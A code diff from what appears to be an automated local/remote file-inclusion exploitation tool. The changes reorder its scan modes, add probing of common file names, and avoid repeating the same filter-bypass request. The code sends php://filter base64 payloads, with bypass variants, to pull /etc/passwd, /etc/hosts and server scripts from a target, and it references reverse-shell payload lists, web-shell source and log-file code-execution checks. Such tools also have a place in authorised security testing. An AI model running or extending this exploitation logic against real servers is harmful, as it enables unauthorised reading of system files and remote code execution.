@@ -14,7 +14,7 @@ from core.constants import *
 from core.constants import LOG_STACKTRACE_ON, LOG_DYNAMIC_PARAMETER, LOG_CONTENT_NOT_STABLE, LOG_CONTENT_STABLE
 from core.filter_bypass import get_bypass_possibilities
 from core.io import get_resource, save
-from core.log import info, ask, warn, verbose, success, err, set_global_verbose, is_verbose_mode
+from core.log import info, ask, warn, verbose, success, err, set_global_verbose, is_verbose_mode, is_debug_mode
 from core.misc import dict_inject_marker, get_web_shell_post_cmd_src
 from core.misc import get_web_shell_src
 from core.mode import Mode
@@ -24,7 +24,7 @@ from core.net import ssh_login, silent_kill_http_server, get_external_ip, ftp_lo
 from core.parse_utils import base64_decode_utf_8, get_possible_base64_strings, parse_etc_passwd, \
     is_valid_port, is_valid_ip, base64_encode_utf_8, decode_possible_base64_strings, is_valid_url, extract_cmd_response
 from core.payload_data import core_get_by_name, core_get_common_doc_roots, core_get_linux_fuzz_arr, \
-    core_get_log_files, core_get_home_rel, core_get_rev_shell_json_arr, core_get_proc_files
+    core_get_log_files, core_get_home_rel, core_get_rev_shell_json_arr, core_get_proc_files, core_get_common_file_names
 from core.str_utils import contains_words, join_char, substr, remove_prefix, longestCommonPrefix, longestCommonSuffix, \
     remove_suffix, random_str
 from requests import Response
@@ -345,6 +345,9 @@ class Scan:
         # check if content is stable for length based heuristics
         self.quick_target_check()
 
+        if self.mode == Mode.all or self.mode == Mode.filter:
+            self.start_php_filter_fuzz()
+
         if self.mode == Mode.all or self.mode == Mode.session:
             self.start_sess_check()
 
@@ -353,9 +356,6 @@ class Scan:
 
         if self.mode == Mode.all or self.mode == Mode.log:
             self.start_check_for_log_file_rce()
-
-        if self.mode == Mode.all or self.mode == Mode.filter:
-            self.start_php_filter_fuzz()
 
         if self.mode == Mode.all or self.mode == Mode.fuzz:
             self.start_file_fuzz()
@@ -544,32 +544,30 @@ class Scan:
 
     def start_php_filter_fuzz(self):
 
-        info("Check Filter")
+        info("Check php://filter")
 
-        doc_roots = core_get_common_doc_roots()
+        # absolute paths
         if self.document_root:
-            doc_roots.insert(0, self.document_root)
+            doc_roots = [self.document_root]
+        else:
+            doc_roots = core_get_common_doc_roots()
 
-        script_paths = [join_char(root, self.url_relative_path, "/") for root in doc_roots]
+        possible_paths = [join_char(root, self.url_relative_path, "/") for root in doc_roots]
 
-        files_to_check = []
+        for name in core_get_common_file_names():
+            possible_paths.append(name)
+            if self.server_append_suffix is not None and "php" not in self.server_append_suffix:
+                possible_paths.append(name + ".php")
+
+        # common *nix files; by default 644
+        files_to_check = [core_get_by_name("/etc/hosts"), core_get_by_name("/etc/passwd")]
 
         # try including script itself
-        for path in script_paths:
+        for path in possible_paths:
             files_to_check.append({
                 "file": path,
                 "successWords": ["<?php", "?>", "<body>"]
             })
-
-            # without extension
-            files_to_check.append({
-                "file": path.replace(".php", ""),
-                "successWords": ["<?php", "?>", "<body>"]
-            })
-
-        # common *nix files; by default 644
-        files_to_check.append(core_get_by_name("/etc/hosts"))
-        files_to_check.append(core_get_by_name("/etc/passwd"))
 
         for file in files_to_check:
             included = self.php_filter_include(file)
@@ -688,6 +686,10 @@ class Scan:
                     return 0
 
         if not is_success:
+
+            if self.batch:
+                return
+
             y = ask("RFI seems not exploitable (or outgoing traffic blocked), still continue RFI checks? [Y][n]: ")
             if y != "Y" and y != "y":
                 return
@@ -749,12 +751,18 @@ class Scan:
             # no filter found so far/ existing filter didnt seem to work
             filters = get_bypass_possibilities()
 
+            requests_made = []
+
             for bypass in filters:
 
-                payload = bypass.adjust(file_path)
-                response = self.send_payload_and_cut(
-                    payload="php://filter/convert.base64-encode/resource=%s" % payload, hide_debug=hide_debug,
-                    **kwargs)
+                payload = bypass.adjust("php://filter/convert.base64-encode/resource=" + file_path)
+
+                if payload in requests_made:
+                    continue
+
+                requests_made.append(payload)
+
+                response = self.send_payload_and_cut(payload=payload, hide_debug=hide_debug, **kwargs)
 
                 if not hide_debug:
                     hide_debug = True
@@ -797,9 +805,16 @@ class Scan:
         filters = get_bypass_possibilities()
         hide_debug = False
 
+        requests_made = []
+
         for bypass in filters:
 
             payload['file'] = bypass.adjust(file_path)
+
+            if payload['file'] in requests_made:
+                continue
+            requests_made.append(payload['file'])
+
             is_success = self.try_rce_file_without_bypass(payload, file_path, hide_debug=hide_debug)
 
             if not hide_debug:
@@ -1123,7 +1138,7 @@ class Scan:
 
             self.amount_payloads_sent = self.amount_payloads_sent + 1
 
-            if not hide_debug:
+            if not hide_debug or is_debug_mode():
                 verbose(f"Payload: {payload}\tStatus: ({response.status_code}) [Size: {len(response.content)}]")
 
             self.analyze_response(payload, response.text)
@@ -1168,7 +1183,7 @@ class Scan:
                     abs_path = abs_path.replace(rm, "")
                     self.document_root = abs_path
 
-            if not self.server_suffix:
+            if not self.server_append_suffix:
 
                 server_file_name = substr(res, "Failed opening '", "' for inclusion")
                 if not server_file_name:
@@ -1176,7 +1191,7 @@ class Scan:
 
                 if payload in server_file_name:
                     server_file_name = server_file_name.replace(payload, "")
-                    self.server_suffix = server_file_name
+                    self.server_append_suffix = server_file_name
 
         title = substr(res, "<title>", "</title>")
         if title and not self.site_title:
@@ -1221,7 +1236,7 @@ class Scan:
             if included:
                 break
 
-        if not self.filter_bypass and not param_fuzzing:
+        if not self.filter_bypass and not param_fuzzing and not self.batch and not self.mode == Mode.filter:
             y = ask("No bypass found, move on? [Y][n]: ")
             if y != "" and y != "Y" and y != "y":
                 sys.exit(0)
@@ -1291,11 +1306,11 @@ class Scan:
         self.__document_root = p
 
     @property
-    def server_suffix(self):
+    def server_append_suffix(self):
         return self.__server_suffix
 
-    @server_suffix.setter
-    def server_suffix(self, p):
+    @server_append_suffix.setter
+    def server_append_suffix(self, p):
         if self.__server_suffix:
             return
 
